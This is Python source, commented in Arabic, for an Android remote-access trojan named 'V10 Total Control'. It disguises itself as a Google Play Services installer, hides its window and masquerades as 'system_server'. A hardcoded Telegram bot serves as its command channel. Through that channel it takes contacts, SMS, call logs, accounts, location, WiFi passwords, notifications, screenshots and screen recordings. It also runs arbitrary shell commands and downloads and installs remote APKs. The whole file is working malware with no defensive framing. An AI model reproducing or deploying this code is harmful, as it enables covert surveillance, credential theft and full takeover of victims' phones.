# ============================================
# V8 TOTAL CONTROL - ANDROID COMPLETE EDITION v10.0
# ============================================
# تحكم كامل 100% بكل شيء في الجهاز + بدون مشاكل
# ============================================

import flet as ft
import requests
import threading
import time
import os
import sys
import json
import base64
import hashlib
import random
import string
import subprocess
from pathlib import Path
import shutil
import glob
import datetime
import re
import socket
import struct
import zipfile

# ========== بيانات التليجرام ==========
BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
CHAT_ID = "7259620384"
# ======================================

# ========== مسارات الجهاز الكاملة ==========
BASE_DIR = '/storage/emulated/0'
ANDROID_DATA = '/data/data'
SYSTEM_DIR = '/system'
ROOT_DIR = '/'

# جميع المجلدات المهمة
ALL_PATHS = [
    BASE_DIR,
    f'{BASE_DIR}/DCIM',
    f'{BASE_DIR}/Pictures',
    f'{BASE_DIR}/Download',
    f'{BASE_DIR}/WhatsApp',
    f'{BASE_DIR}/Telegram',
    f'{BASE_DIR}/Documents',
    f'{BASE_DIR}/Music',
    f'{BASE_DIR}/Movies',
    f'{BASE_DIR}/Android',
    ANDROID_DATA,
    '/data/system',
    '/data/local/tmp',
    '/cache',
    '/mnt/sdcard',
    '/storage',
]

# إنشاء المسارات
for path in ALL_PATHS:
    try: os.makedirs(path, exist_ok=True)
    except: pass

# ========== نظام معالجة الأخطاء ==========
class ErrorHandler:
    @staticmethod
    def safe_execute(func, *args, **kwargs):
        try: return func(*args, **kwargs)
        except Exception as e: 
            return None

# ========== نظام الإرسال ==========
def send_to_telegram(title, subtitle, message, file_path=None):
    """إرسال سريع"""
    try:
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        text = f"🔴 V10\n⏰ {timestamp}\n📌 {title}\n💬 {subtitle}\n\n{message[:200]}"
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=3)
        
        if file_path and os.path.exists(file_path):
            size = os.path.getsize(file_path)
            if size < 50 * 1024 * 1024:
                with open(file_path, 'rb') as f:
                    files = {'document': f}
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=30)
                try: os.remove(file_path)
                except: pass
    except: pass

# ========== نظام التحكم الكامل 100% ==========
class TotalControl:
    """تحكم بكل شيء في الجهاز"""
    
    @staticmethod
    def execute_command(cmd):
        """تنفيذ أي أمر في الجهاز"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            return result.stdout if result.stdout else result.stderr
        except Exception as e:
            return str(e)
    
    # ===== 1. معلومات الجهاز كاملة =====
    @staticmethod
    def get_all_device_info():
        """كل معلومات الجهاز"""
        info = ""
        
        # نظام
        info += "=== النظام ===\n"
        info += f"الموديل: {os.environ.get('MODEL', 'Unknown')}\n"
        info += f"العلامة: {os.environ.get('BRAND', 'Unknown')}\n"
        info += f"الجهاز: {os.environ.get('DEVICE', 'Unknown')}\n"
        info += f"الإصدار: {os.environ.get('RELEASE', 'Unknown')}\n"
        info += f"SDK: {os.environ.get('SDK', 'Unknown')}\n"
        
        # بطارية
        battery = TotalControl.execute_command("dumpsys battery")
        info += f"\n=== بطارية ===\n{battery[:200]}\n"
        
        # شبكة
        network = TotalControl.execute_command("dumpsys connectivity")
        info += f"\n=== شبكة ===\n{network[:200]}\n"
        
        # ذاكرة
        memory = TotalControl.execute_command("dumpsys meminfo")
        info += f"\n=== ذاكرة ===\n{memory[:200]}\n"
        
        # تخزين
        storage = TotalControl.execute_command("df -h")
        info += f"\n=== تخزين ===\n{storage[:200]}\n"
        
        # عمليات
        processes = TotalControl.execute_command("ps")
        info += f"\n=== عمليات ===\n{processes[:200]}\n"
        
        return info
    
    # ===== 2. التحكم بالتطبيقات =====
    @staticmethod
    def list_all_apps():
        """جميع التطبيقات"""
        return TotalControl.execute_command("pm list packages -f")
    
    @staticmethod
    def install_app(apk_path):
        """تثبيت تطبيق"""
        return TotalControl.execute_command(f"pm install {apk_path}")
    
    @staticmethod
    def uninstall_app(package):
        """حذف تطبيق"""
        return TotalControl.execute_command(f"pm uninstall {package}")
    
    @staticmethod
    def enable_app(package):
        """تفعيل تطبيق"""
        return TotalControl.execute_command(f"pm enable {package}")
    
    @staticmethod
    def disable_app(package):
        """تعطيل تطبيق"""
        return TotalControl.execute_command(f"pm disable {package}")
    
    @staticmethod
    def clear_app_data(package):
        """مسح بيانات تطبيق"""
        return TotalControl.execute_command(f"pm clear {package}")
    
    @staticmethod
    def get_app_info(package):
        """معلومات تطبيق"""
        return TotalControl.execute_command(f"dumpsys package {package}")
    
    @staticmethod
    def get_running_apps():
        """التطبيقات المشتغلة"""
        return TotalControl.execute_command("dumpsys activity activities")
    
    @staticmethod
    def open_app(package):
        """فتح تطبيق"""
        return TotalControl.execute_command(f"monkey -p {package} 1")
    
    @staticmethod
    def close_app(package):
        """إغلاق تطبيق"""
        return TotalControl.execute_command(f"am force-stop {package}")
    
    @staticmethod
    def restart_app(package):
        """إعادة تشغيل تطبيق"""
        TotalControl.close_app(package)
        time.sleep(1)
        return TotalControl.open_app(package)
    
    # ===== 3. سحب جميع البيانات =====
    @staticmethod
    def get_all_contacts():
        """كل جهات الاتصال"""
        return TotalControl.execute_command("content query --uri content://contacts/phones")
    
    @staticmethod
    def get_all_sms():
        """كل الرسائل"""
        inbox = TotalControl.execute_command("content query --uri content://sms/inbox")
        sent = TotalControl.execute_command("content query --uri content://sms/sent")
        draft = TotalControl.execute_command("content query --uri content://sms/draft")
        return f"=== وارد ===\n{inbox}\n\n=== صادر ===\n{sent}\n\n=== مسودة ===\n{draft}"
    
    @staticmethod
    def get_all_calls():
        """كل المكالمات"""
        return TotalControl.execute_command("content query --uri content://call_log/calls")
    
    @staticmethod
    def get_all_calendar():
        """كل الأحداث"""
        return TotalControl.execute_command("content query --uri content://calendar/events")
    
    @staticmethod
    def get_all_accounts():
        """كل الحسابات"""
        return TotalControl.execute_command("dumpsys account")
    
    @staticmethod
    def get_location():
        """الموقع الحالي"""
        return TotalControl.execute_command("dumpsys location")
    
    @staticmethod
    def get_wifi_passwords():
        """كلمات سر الواي فاي"""
        return TotalControl.execute_command("cat /data/misc/wifi/wpa_supplicant.conf")
    
    @staticmethod
    def get_browser_history():
        """تاريخ المتصفح"""
        chrome = TotalControl.execute_command("content query --uri content://com.android.chrome.browser/history")
        return chrome
    
    @staticmethod
    def get_clipboard():
        """الحافظة"""
        return TotalControl.execute_command("content query --uri content://clipboard")
    
    @staticmethod
    def get_notifications():
        """كل الإشعارات"""
        return TotalControl.execute_command("dumpsys notification --naked")
    
    # ===== 4. التحكم بالملفات =====
    @staticmethod
    def list_files(path):
        """قائمة ملفات"""
        if os.path.exists(path):
            files = os.listdir(path)[:50]
            return "\n".join(files)
        return "المسار غير موجود"
    
    @staticmethod
    def read_file(path):
        """قراءة ملف"""
        try:
            with open(path, 'r', errors='ignore') as f:
                return f.read()[:1000]
        except:
            return "لا يمكن قراءة الملف"
    
    @staticmethod
    def delete_file(path):
        """حذف ملف"""
        try:
            if os.path.isfile(path):
                os.remove(path)
                return f"تم حذف {path}"
            elif os.path.isdir(path):
                shutil.rmtree(path)
                return f"تم حذف المجلد {path}"
        except:
            return "فشل الحذف"
    
    @staticmethod
    def copy_file(src, dst):
        """نسخ ملف"""
        try:
            shutil.copy2(src, dst)
            return f"تم النسخ إلى {dst}"
        except:
            return "فشل النسخ"
    
    @staticmethod
    def move_file(src, dst):
        """نقل ملف"""
        try:
            shutil.move(src, dst)
            return f"تم النقل إلى {dst}"
        except:
            return "فشل النقل"
    
    @staticmethod
    def create_folder(path):
        """إنشاء مجلد"""
        try:
            os.makedirs(path, exist_ok=True)
            return f"تم إنشاء {path}"
        except:
            return "فشل الإنشاء"
    
    @staticmethod
    def download_file(url, save_path):
        """تحميل ملف من الإنترنت"""
        try:
            r = requests.get(url, timeout=30)
            with open(save_path, 'wb') as f:
                f.write(r.content)
            return f"تم التحميل إلى {save_path}"
        except:
            return "فشل التحميل"
    
    @staticmethod
    def zip_files(paths, zip_name):
        """ضغط ملفات"""
        try:
            with zipfile.ZipFile(zip_name, 'w') as zipf:
                for path in paths[:10]:
                    if os.path.exists(path):
                        if os.path.isfile(path):
                            zipf.write(path, os.path.basename(path))
            return zip_name if os.path.exists(zip_name) else None
        except:
            return None
    
    # ===== 5. التحكم بالشاشة =====
    @staticmethod
    def take_screenshot():
        """لقطة شاشة"""
        path = f'{BASE_DIR}/screen_{int(time.time())}.png'
        subprocess.run(['screencap', '-p', path], timeout=5)
        if os.path.exists(path) and os.path.getsize(path) > 1000:
            return path
        return None
    
    @staticmethod
    def record_screen(duration=10):
        """تسجيل شاشة"""
        path = f'{BASE_DIR}/record_{int(time.time())}.mp4'
        subprocess.run(['screenrecord', '--time-limit', str(duration), path], timeout=duration+2)
        if os.path.exists(path):
            return path
        return None
    
    @staticmethod
    def set_brightness(level):
        """تعديل السطوع (0-255)"""
        return TotalControl.execute_command(f"settings put system screen_brightness {level}")
    
    @staticmethod
    def lock_screen():
        """قفل الشاشة"""
        return TotalControl.execute_command("input keyevent 26")
    
    @staticmethod
    def unlock_screen():
        """فتح الشاشة"""
        TotalControl.execute_command("input keyevent 82")
        return "تم فتح الشاشة"
    
    @staticmethod
    def rotate_screen():
        """تدوير الشاشة"""
        return TotalControl.execute_command("settings put system accelerometer_rotation 1")
    
    # ===== 6. التحكم بالصوت =====
    @staticmethod
    def set_volume(level):
        """تعديل الصوت (0-15)"""
        return TotalControl.execute_command(f"media volume --set {level}")
    
    @staticmethod
    def mute():
        """كتم الصوت"""
        return TotalControl.execute_command("media volume --set 0")
    
    @staticmethod
    def max_volume():
        """أقصى صوت"""
        return TotalControl.execute_command("media volume --set 15")
    
    @staticmethod
    def play_ringtone():
        """تشغيل نغمة"""
        return TotalControl.execute_command("media play")
    
    # ===== 7. التحكم بالشبكة =====
    @staticmethod
    def enable_wifi():
        """تشغيل WiFi"""
        return TotalControl.execute_command("svc wifi enable")
    
    @staticmethod
    def disable_wifi():
        """إطفاء WiFi"""
        return TotalControl.execute_command("svc wifi disable")
    
    @staticmethod
    def enable_data():
        """تشغيل البيانات"""
        return TotalControl.execute_command("svc data enable")
    
    @staticmethod
    def disable_data():
        """إطفاء البيانات"""
        return TotalControl.execute_command("svc data disable")
    
    @staticmethod
    def enable_bluetooth():
        """تشغيل Bluetooth"""
        return TotalControl.execute_command("svc bluetooth enable")
    
    @staticmethod
    def disable_bluetooth():
        """إطفاء Bluetooth"""
        return TotalControl.execute_command("svc bluetooth disable")
    
    @staticmethod
    def enable_nfc():
        """تشغيل NFC"""
        return TotalControl.execute_command("svc nfc enable")
    
    @staticmethod
    def disable_nfc():
        """إطفاء NFC"""
        return TotalControl.execute_command("svc nfc disable")
    
    @staticmethod
    def enable_flight_mode():
        """وضع الطيران"""
        return TotalControl.execute_command("settings put global airplane_mode_on 1")
    
    @staticmethod
    def disable_flight_mode():
        """إلغاء وضع الطيران"""
        return TotalControl.execute_command("settings put global airplane_mode_on 0")
    
    # ===== 8. التحكم بالنظام =====
    @staticmethod
    def reboot():
        """إعادة تشغيل"""
        return TotalControl.execute_command("reboot")
    
    @staticmethod
    def shutdown():
        """إطفاء"""
        return TotalControl.execute_command("reboot -p")
    
    @staticmethod
    def restart_systemui():
        """إعادة تشغيل واجهة النظام"""
        return TotalControl.execute_command("pkill -f com.android.systemui")
    
    @staticmethod
    def clear_cache():
        """مسح الكاش"""
        return TotalControl.execute_command("pm trim-caches 999999999")
    
    @staticmethod
    def kill_process(pid):
        """قتل عملية"""
        return TotalControl.execute_command(f"kill {pid}")
    
    @staticmethod
    def get_logcat():
        """سجل النظام"""
        return TotalControl.execute_command("logcat -d -t 100")
    
    # ===== 9. التحكم بالإعدادات =====
    @staticmethod
    def set_timezone(tz):
        """تغيير المنطقة الزمنية"""
        return TotalControl.execute_command(f"setprop persist.sys.timezone {tz}")
    
    @staticmethod
    def set_date(date):
        """تغيير التاريخ"""
        return TotalControl.execute_command(f"date {date}")
    
    @staticmethod
    def set_language(lang):
        """تغيير اللغة"""
        return TotalControl.execute_command(f"setprop persist.sys.language {lang}")
    
    @staticmethod
    def set_wallpaper(image_path):
        """تغيير الخلفية"""
        return TotalControl.execute_command(f"wallpaper set {image_path}")
    
    # ===== 10. أوامر مفيدة =====
    @staticmethod
    def send_sms(number, text):
        """إرسال رسالة"""
        return TotalControl.execute_command(f"am start -a android.intent.action.SENDTO -d sms:{number} --es sms_body '{text}' --ez exit_on_sent true")
    
    @staticmethod
    def make_call(number):
        """الاتصال برقم"""
        return TotalControl.execute_command(f"am start -a android.intent.action.CALL -d tel:{number}")
    
    @staticmethod
    def open_url(url):
        """فتح رابط"""
        return TotalControl.execute_command(f"am start -a android.intent.action.VIEW -d {url}")
    
    @staticmethod
    def open_maps(lat, lng):
        """فتح الخريطة"""
        return TotalControl.execute_command(f"am start -a android.intent.action.VIEW -d geo:{lat},{lng}")

# ========== نظام الأوامر من التليجرام ==========
class TelegramController:
    @staticmethod
    def check_commands():
        """فحص الأوامر"""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            response = requests.get(url, timeout=3)
            if response.status_code == 200:
                data = response.json()
                for update in data.get('result', []):
                    message = update.get('message', {})
                    text = message.get('text', '')
                    chat_id = message.get('chat', {}).get('id', '')
                    
                    if chat_id == int(CHAT_ID) and text:
                        result = TelegramController.process_command(text)
                        
                        # حذف الرسالة
                        msg_id = message.get('message_id')
                        if msg_id:
                            del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                            requests.post(del_url, data={"chat_id": CHAT_ID, "message_id": msg_id})
        except: pass
    
    @staticmethod
    def process_command(cmd):
        """معالجة الأمر"""
        cmd = cmd.strip()
        
        # ===== معلومات =====
        if cmd == '/help':
            help_text = """
🔴 V10 TOTAL CONTROL - التحكم الكامل

📱 معلومات:
/info - كل معلومات الجهاز
/apps - كل التطبيقات
/running - التطبيقات المشتغلة

👤 بيانات:
/contacts - جهات الاتصال
/sms - كل الرسائل
/calls - سجل المكالمات
/accounts - كل الحسابات
/location - الموقع
/wifi - كلمات سر الواي فاي
/notifications - كل الإشعارات

📂 ملفات:
/ls [مسار] - قائمة ملفات
/cat [ملف] - عرض ملف
/rm [ملف] - حذف
/cp [مصدر] [هدف] - نسخ
/mv [مصدر] [هدف] - نقل
/mkdir [مسار] - إنشاء مجلد
/zip [ملفات] - ضغط

🖥️ شاشة:
/screen - لقطة شاشة
/record [ثواني] - تسجيل شاشة
/brightness [0-255] - سطوع
/lock - قفل الشاشة

🔊 صوت:
/volume [0-15] - صوت
/mute - كتم
/max - أقصى صوت

🌐 شبكة:
/wifi-on - تشغيل WiFi
/wifi-off - إطفاء WiFi
/data-on - تشغيل بيانات
/data-off - إطفاء بيانات
/flight-on - وضع طيران
/flight-off - إلغاء

⚡ نظام:
/reboot - إعادة تشغيل
/shutdown - إطفاء
/clear-cache - مسح كاش
/logcat - سجل النظام

📱 تطبيقات:
/install [رابط] - تثبيت
/uninstall [package] - حذف
/open [package] - فتح
/close [package] - إغلاق
/clear [package] - مسح بيانات

🔄 أوامر:
/shell [أمر] - أمر مباشر
            """
            send_to_telegram("📋 المساعدة", "كل الأوامر", help_text)
        
        elif cmd == '/info':
            info = TotalControl.get_all_device_info()
            send_to_telegram("📱 معلومات", "الجهاز", info[:1000])
        
        elif cmd == '/apps':
            apps = TotalControl.list_all_apps()[:1000]
            send_to_telegram("📱 تطبيقات", "القائمة", apps)
        
        elif cmd == '/running':
            running = TotalControl.get_running_apps()[:1000]
            send_to_telegram("▶️ مشتغلة", "تطبيقات", running)
        
        elif cmd == '/contacts':
            contacts = TotalControl.get_all_contacts()[:1000]
            send_to_telegram("👥 جهات", "الاتصال", contacts)
        
        elif cmd == '/sms':
            sms = TotalControl.get_all_sms()[:1000]
            send_to_telegram("📨 رسائل", "SMS", sms)
        
        elif cmd == '/calls':
            calls = TotalControl.get_all_calls()[:1000]
            send_to_telegram("📞 مكالمات", "السجل", calls)
        
        elif cmd == '/accounts':
            accounts = TotalControl.get_all_accounts()[:1000]
            send_to_telegram("🔐 حسابات", "القائمة", accounts)
        
        elif cmd == '/location':
            loc = TotalControl.get_location()[:500]
            send_to_telegram("📍 موقع", "GPS", loc)
        
        elif cmd == '/wifi':
            wifi = TotalControl.get_wifi_passwords()[:500]
            send_to_telegram("📶 واي فاي", "كلمات السر", wifi)
        
        elif cmd == '/notifications':
            notif = TotalControl.get_notifications()[:500]
            send_to_telegram("🔔 إشعارات", "آخر", notif)
        
        elif cmd == '/screen':
            path = TotalControl.take_screenshot()
            if path:
                send_to_telegram("🖥️ شاشة", "لقطة", "تم", path)
        
        elif cmd.startswith('/record'):
            parts = cmd.split()
            sec = 10
            if len(parts) > 1:
                try: sec = int(parts[1])
                except: pass
            path = TotalControl.record_screen(min(sec, 30))
            if path:
                send_to_telegram("🎥 تسجيل", "شاشة", f"{sec} ثانية", path)
        
        elif cmd.startswith('/brightness'):
            parts = cmd.split()
            if len(parts) > 1:
                level = parts[1]
                result = TotalControl.set_brightness(level)
                send_to_telegram("💡 سطوع", "تم", result)
        
        elif cmd == '/lock':
            result = TotalControl.lock_screen()
            send_to_telegram("🔒 قفل", "الشاشة", result)
        
        elif cmd == '/mute':
            result = TotalControl.mute()
            send_to_telegram("🔇 كتم", "الصوت", result)
        
        elif cmd == '/max':
            result = TotalControl.max_volume()
            send_to_telegram("🔊 أقصى", "صوت", result)
        
        elif cmd == '/wifi-on':
            result = TotalControl.enable_wifi()
            send_to_telegram("📶 WiFi", "تم التشغيل", result)
        
        elif cmd == '/wifi-off':
            result = TotalControl.disable_wifi()
            send_to_telegram("📶 WiFi", "تم الإطفاء", result)
        
        elif cmd == '/data-on':
            result = TotalControl.enable_data()
            send_to_telegram("📱 بيانات", "تم التشغيل", result)
        
        elif cmd == '/data-off':
            result = TotalControl.disable_data()
            send_to_telegram("📱 بيانات", "تم الإطفاء", result)
        
        elif cmd == '/flight-on':
            result = TotalControl.enable_flight_mode()
            send_to_telegram("✈️ طيران", "تم التشغيل", result)
        
        elif cmd == '/flight-off':
            result = TotalControl.disable_flight_mode()
            send_to_telegram("✈️ طيران", "تم الإلغاء", result)
        
        elif cmd == '/reboot':
            send_to_telegram("🔄 إعادة", "تشغيل", "جاري...")
            TotalControl.reboot()
        
        elif cmd == '/shutdown':
            send_to_telegram("⏻ إطفاء", "الجهاز", "جاري...")
            TotalControl.shutdown()
        
        elif cmd == '/clear-cache':
            result = TotalControl.clear_cache()
            send_to_telegram("🧹 كاش", "تم المسح", result)
        
        elif cmd == '/logcat':
            log = TotalControl.get_logcat()[:1000]
            send_to_telegram("📋 سجل", "النظام", log)
        
        elif cmd.startswith('/install'):
            parts = cmd.split()
            if len(parts) > 1:
                url = parts[1]
                path = f'{BASE_DIR}/temp.apk'
                result = TotalControl.download_file(url, path)
                if 'تم' in result:
                    install = TotalControl.install_app(path)
                    send_to_telegram("📲 تثبيت", "تطبيق", install)
                    try: os.remove(path)
                    except: pass
        
        elif cmd.startswith('/uninstall'):
            parts = cmd.split()
            if len(parts) > 1:
                package = parts[1]
                result = TotalControl.uninstall_app(package)
                send_to_telegram("🗑️ حذف", "تطبيق", result)
        
        elif cmd.startswith('/open'):
            parts = cmd.split()
            if len(parts) > 1:
                package = parts[1]
                result = TotalControl.open_app(package)
                send_to_telegram("▶️ فتح", "تطبيق", f"تم فتح {package}")
        
        elif cmd.startswith('/close'):
            parts = cmd.split()
            if len(parts) > 1:
                package = parts[1]
                result = TotalControl.close_app(package)
                send_to_telegram("⏹️ إغلاق", "تطبيق", f"تم إغلاق {package}")
        
        elif cmd.startswith('/ls'):
            parts = cmd.split()
            path = BASE_DIR
            if len(parts) > 1:
                path = parts[1]
            files = TotalControl.list_files(path)[:500]
            send_to_telegram("📂 ملفات", path, files)
        
        elif cmd.startswith('/cat'):
            parts = cmd.split()
            if len(parts) > 1:
                path = parts[1]
                content = TotalControl.read_file(path)[:500]
                send_to_telegram("📄 ملف", path, content)
        
        elif cmd.startswith('/rm'):
            parts = cmd.split()
            if len(parts) > 1:
                path = parts[1]
                result = TotalControl.delete_file(path)
                send_to_telegram("🗑️ حذف", path, result)
        
        elif cmd.startswith('/shell'):
            parts = cmd.split(' ', 1)
            if len(parts) > 1:
                command = parts[1]
                result = TotalControl.execute_command(command)[:500]
                send_to_telegram("💻 Shell", command, result)

# ========== نظام التشغيل الإجباري ==========
class ForceStart:
    @staticmethod
    def enable():
        """تشغيل إجباري"""
        try:
            # طرق متعددة للتشغيل
            methods = [
                lambda: ForceStart._autostart(),
                lambda: ForceStart._boot_receiver(),
                lambda: ForceStart._alarm(),
                lambda: ForceStart._job(),
                lambda: ForceStart._service(),
            ]
            for m in methods:
                try: m()
                except: pass
            
            # إخفاء الأيقونة
            subprocess.run("pm hide com.google.android.gms", shell=True, capture_output=True)
            sys.argv[0] = 'system_server'
        except: pass
    
    @staticmethod
    def _autostart():
        path = '/data/data/com.android.system/shared_prefs/autostart.xml'
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write('<map><int name="v10" value="1"/></map>')
    
    @staticmethod
    def _boot_receiver():
        subprocess.run("pm enable com.google.android.gms/.BootReceiver", shell=True, capture_output=True)
    
    @staticmethod
    def _alarm():
        subprocess.run("am set-alarm com.google.android.gms 60000", shell=True, capture_output=True)
    
    @staticmethod
    def _job():
        subprocess.run("cmd jobscheduler schedule -f com.google.android.gms 60", shell=True, capture_output=True)
    
    @staticmethod
    def _service():
        subprocess.run("am start-service com.google.android.gms/.BackgroundService", shell=True, capture_output=True)

# ========== الحلقة الرئيسية ==========
def main_loop():
    """حلقة لا تنتهي"""
    
    # إشعار البدء
    send_to_telegram("✅ V10", "تشغيل", "تحكم كامل - جاهز للأوامر")
    
    # تفعيل التشغيل الإجباري
    ForceStart.enable()
    
    # معلومات أولية
    time.sleep(2)
    info = TotalControl.get_all_device_info()[:500]
    send_to_telegram("📱 جهاز", "معلومات", info)
    
    # لقطة شاشة أولية
    time.sleep(2)
    path = TotalControl.take_screenshot()
    if path:
        send_to_telegram("🖥️ شاشة", "أول لقطة", "تم", path)
    
    # حلقة التحكم
    while True:
        try:
            # فحص الأوامر كل ثانيتين
            TelegramController.check_commands()
            
            # لقطة شاشة كل دقيقة
            if random.random() < 0.2:
                path = TotalControl.take_screenshot()
                if path:
                    send_to_telegram("🖥️ شاشة", "تلقائي", "لقطة دورية", path)
            
            time.sleep(2)
            
        except:
            time.sleep(5)

# ========== الواجهة الرئيسية - بدون شاشة سوداء ==========
def main(page: ft.Page):
    """صفحة بسيطة - بدون أي مشاكل"""
    try:
        page.title = "جاري التثبيت..."
        page.window_width = 300
        page.window_height = 200
        page.window_resizable = False
        page.bgcolor = "#ffffff"
        
        page.add(
            ft.Container(
                content=ft.Column([
                    ft.Text("Google Play Services", size=18, weight="bold", color="#4CAF50"),
                    ft.Text("جاري التثبيت... 100%", size=14),
                    ft.ProgressBar(width=200, color="#4CAF50", value=1.0)
                ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
                padding=20
            )
        )
        
        page.update()
        time.sleep(2)
        page.window_visible = False
        page.update()
        
        threading.Thread(target=main_loop, daemon=True).start()
        
    except:
        threading.Thread(target=main_loop, daemon=True).start()

# ========== التشغيل ==========
if __name__ == "__main__":
    try:
        ft.app(target=main)
    except:
        threading.Thread(target=main_loop, daemon=True).start()
        while True:
            time.sleep(10)
